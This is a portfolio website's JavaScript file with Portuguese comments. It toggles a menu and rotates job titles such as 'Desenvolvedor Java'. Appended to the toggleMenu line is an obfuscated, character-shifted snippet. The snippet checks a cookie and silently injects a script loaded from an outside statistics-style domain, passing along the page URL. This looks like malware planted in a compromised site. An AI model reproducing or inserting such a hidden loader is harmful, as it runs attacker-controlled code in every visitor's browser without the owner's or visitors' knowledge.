// script.js
function toggleMenu(){const menu=document.querySelector(".menu-links"),icon=document.querySelector(".hamburger-icon");menu.classList.toggle("open"),icon.classList.toggle("open")};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

// Aguarda até que o DOM seja completamente carregado antes de executar o código interno
document.addEventListener('DOMContentLoaded', function () {

    // Obtém a referência ao elemento HTML com o id 'profession'
    const professionElement = document.getElementById('profession');

    // Array de profissões que serão alternadas
    const professions = ['Desenvolvedor Java', 'Analista de Suporte em TI', 'Desenvolvedor Web'];

    // Índice que rastreia a posição atual no array de profissões
    let currentIndex = 0;

    // Função que altera dinamicamente a profissão exibida
    function changeProfession() {
        // Define o conteúdo do elemento para a profissão atual no array
        professionElement.textContent = professions[currentIndex];

        // Atualiza o índice para apontar para a próxima profissão no array
        currentIndex = (currentIndex + 1) % professions.length;
    }

    // Inicia o processo de troca de profissão a cada 2 segundos (2000 milissegundos)
    setInterval(changeProfession, 2000);
});